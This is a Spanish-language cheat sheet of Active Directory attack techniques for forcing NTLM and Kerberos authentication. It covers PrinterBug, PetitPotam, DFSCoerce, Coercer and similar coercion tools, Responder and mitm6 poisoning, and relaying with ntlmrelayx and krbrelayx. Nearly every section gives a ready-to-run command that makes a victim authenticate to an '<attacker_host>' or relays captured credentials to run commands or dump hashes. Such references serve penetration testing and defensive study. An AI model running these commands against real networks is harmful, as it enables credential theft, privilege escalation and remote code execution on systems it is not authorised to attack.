# Técnicas y Herramientas para Forzar Autenticación NTLM y Kerberos en Active Directory

> **Resumen:**  
> Este documento recopila técnicas, herramientas y comandos para forzar autenticaciones NTLM o Kerberos en entornos AD, tanto para ataques de relay como para captura de hashes.

---

## Índice de técnicas

1. [PrinterBug (MS-RPRN)](#1-printerbug-ms-rprn)
2. [PetitPotam (EFSRPC)](#2-petitpotam-efsrpc)
3. [Dementor (DRSUAPI)](#3-dementor-drsuapi)
4. [ShadowCoerce (VSS)](#4-shadowcoerce-vss)
5. [DFSCoerce (DFSNM)](#5-dfscoerce-dfsnm)
6. [Coercer (Multiprotocolo)](#6-coercer-multiprotocolo)
7. [ADIDNS/DNSadmin](#7-adidnsdnsadmin)
8. [Responder (LLMNR/NBT-NS/WPAD/mDNS)](#8-responder-llmnrnbt-nswpadmdns)
9. [WPAD/LLMNR/mDNS/MITM6](#9-wpadllmnrmdnsmitm6)
10. [Otras coerciones (FSRVPCoerce, SchtasksCoerce, ICPRCoerce)](#10-otras-coerciones-fsrvpcoerce-schtaskscoerce-icprcoerce)
11. [NTLMRelayx (relay NTLM)](#11-ntlmrelayx-relay-ntlm)
12. [Krbrelayx (relay Kerberos)](#12-krbrelayx-relay-kerberos)

---

## 1. PrinterBug (MS-RPRN)

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa del servicio de impresión para forzar autenticación NTLM de la víctima hacia el atacante. |
| **Condiciones** | Servicio de impresoras activo en la víctima (por defecto en DCs antiguos, puede estar deshabilitado). |

**Herramientas y comandos:**
- **Linux:**  
  - Impacket/printerbug.py  
    ```bash
    python3 printerbug.py <DOMAIN>/<USER>:<PASS>@<VICTIMA_DC> <attacker_host>
    ```
- **Windows:**  
  - SpoolSample (C#)  
    ```powershell
    SpoolSample.exe <victima> <attacker_host>
    ```

---

## 2. PetitPotam (EFSRPC)

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa del protocolo EFSRPC (MS-EFSR) para forzar autenticación NTLM de la víctima.              |
| **Condiciones** | Víctima debe tener el servicio EFSRPC habilitado (normal en DC/Windows reciente).                |

**Herramientas y comandos:**
- **Linux:**  
  - PetitPotam  
    ```bash
    python3 PetitPotam.py <TARGET> <attacker_host>
    ```

---

## 3. Dementor (DRSUAPI)

| Aspecto      | Detalle                                                                                                 |
|--------------|---------------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa del protocolo de replicación DRSUAPI para forzar autenticación NTLM desde el DC hacia el atacante. |
| **Condiciones** | Acceso a DRSUAPI (normal con usuario autenticado en el dominio, DC objetivo debe estar accesible).     |

**Herramientas y comandos:**
- **Windows:**  
  - Dementor.exe  
    ```powershell
    Dementor.exe --target <DC> --listener <attacker_host>
    ```

---

## 4. ShadowCoerce (VSS)

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa del servicio de Shadow Copies (VSS) para forzar autenticación NTLM.                       |
| **Condiciones** | La máquina objetivo debe tener el servicio de shadow copies expuesto.                            |

**Herramientas y comandos:**
- **Linux:**  
  - ShadowCoerce  
    ```bash
    python3 shadowcoerce.py <TARGET> <attacker_host>
    ```

---

## 5. DFSCoerce (DFSNM)

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa del servicio Distributed File System Namespace (MS-DFSNM) para forzar autenticación.       |
| **Condiciones** | El servicio DFS debe estar activo en la máquina víctima.                                         |

**Herramientas y comandos:**
- **Linux:**  
  - DFSCoerce  
    ```bash
    python3 dfscoerce.py <TARGET> <attacker_host>
    ```

---

## 6. Coercer (Multiprotocolo)

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Herramienta multiprotocolo que automatiza la coerción usando varios protocolos y servicios.      |
| **Condiciones** | Dependen del protocolo elegido (EFSRPC, MS-RPRN, VSS, DFS, etc.).                               |

**Herramientas y comandos:**
- **Linux:**  
  - Coercer  
    ```bash
    python3 coercer.py -t <TARGET> -l <attacker_host>
    ```

---

## 7. ADIDNS/DNSadmin

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Abusa de privilegios DNSadmin para crear registros maliciosos que fuerzan autenticaciones.       |
| **Condiciones** | Privilegios DNSadmin sobre el servidor DNS de AD.                                               |

**Herramientas y comandos:**
- **Windows:**  
  - PowerShell / SharpDNS / scripts  
    ```powershell
    Add-DnsServerResourceRecordCName -Name <fake> -HostNameAlias <attacker_host> -ZoneName <zone>
    ```
- **Linux:**  
  - SharpDNS / scripts personalizados

---

## 8. Responder (LLMNR/NBT-NS/WPAD/mDNS)

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Explota la falta de autenticación en protocolos de resolución de nombres para capturar o relayar hashes NTLM. |
| **Condiciones** | Protocolos LLMNR/NBT-NS/WPAD/mDNS habilitados y usuarios accediendo a recursos no existentes.   |

**Herramientas y comandos:**
- **Linux:**  
  - Responder  
    ```bash
    sudo responder -I <interface>
    ```
- **Windows:**  
  - Inveigh (PowerShell)  
    ```powershell
    Invoke-Inveigh
    ```

---

## 9. WPAD/LLMNR/mDNS/MITM6

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Ataca la autoconfiguración de proxy (WPAD) y la resolución de nombres (LLMNR/mDNS), pudiendo capturar autenticaciones NTLM. MITM6 fuerza el uso de IPv6 para ataques similares. |
| **Condiciones** | Red interna sin segmentar, protocolos no filtrados y clientes con IPv6 habilitado (MITM6).      |

**Herramientas y comandos:**
- **Linux:**  
  - MITM6  
    ```bash
    python3 mitm6.py -i <interface>
    ```

---

## 10. Otras coerciones (FSRVPCoerce, SchtasksCoerce, ICPRCoerce)

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Herramientas para abusar de protocolos adicionales y forzar autenticación NTLM.                 |
| **Condiciones** | Dependen del protocolo: FSRVP (shadow copies), Task Scheduler, ICPR, etc.                       |

**Herramientas y comandos:**
- **Linux:**  
  - FSRVPCoerce  
    ```bash
    python3 fsrvpcoerce.py <TARGET> <attacker_host>
    ```
  - SchtasksCoerce  
    ```bash
    python3 schtaskscoerce.py <TARGET> <attacker_host>
    ```
  - ICPRCoerce  
    ```bash
    python3 icprcoerce.py <TARGET> <attacker_host>
    ```

---

## 11. NTLMRelayx (relay NTLM)

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Relay de autenticaciones NTLM capturadas hacia servicios como SMB, LDAP, HTTP, etc. Permite ejecución de comandos, creación de usuarios, dump de hash, etc. |
| **Condiciones** | El atacante debe recibir conexiones SMB/HTTP de la víctima y tener acceso al servicio destino. SMB signing o LDAP signing deben estar deshabilitados en el destino. |

**Herramientas y comandos:**
- **Linux:**  
  - Impacket/ntlmrelayx.py  
    ```bash
    python3 ntlmrelayx.py -t smb://<target_smb> -smb2support
    ```
    - Relay a LDAP:
    ```bash
    python3 ntlmrelayx.py -t ldap://<target_ldap>
    ```
    - Relay múltiple:
    ```bash
    python3 ntlmrelayx.py -tf targets.txt
    ```
    - Ejecutar comandos:
    ```bash
    python3 ntlmrelayx.py -t smb://<target> -c <comando>
    ```

> **Nota:**  
> Suele usarse junto a técnicas de coerción o Responder.  
> No conviene lanzar Responder y ntlmrelayx.py simultáneamente sobre SMB.

---

## 12. Krbrelayx (relay Kerberos)

| Aspecto      | Detalle                                                                                           |
|--------------|---------------------------------------------------------------------------------------------------|
| **Descripción** | Relay de autenticaciones Kerberos (relaying de tickets TGS a servicios como LDAP, HTTP, SMB, etc.), incluso cuando NTLM no es opción. |
| **Condiciones** | Requiere obtener un ticket de servicio (TGS) válido para el servicio objetivo y que los servicios destino no requieran protecciones extra (S4U2Self/S4U2Proxy no mitigados, firma deshabilitada, etc.). |

**Herramientas y comandos:**
- **Linux:**  
  - krbrelayx (https://github.com/dirkjanm/krbrelayx)  
    ```bash
    python3 krbrelayx.py -h
    # Ejemplo de uso típico:
    python3 krbrelayx.py --target ldap://<target_ldap> --ticket <ticket.kirbi>
    ```

> **Nota:**  
> Ataques relay avanzados, poderosos en entornos Kerberos mal configurados.

---
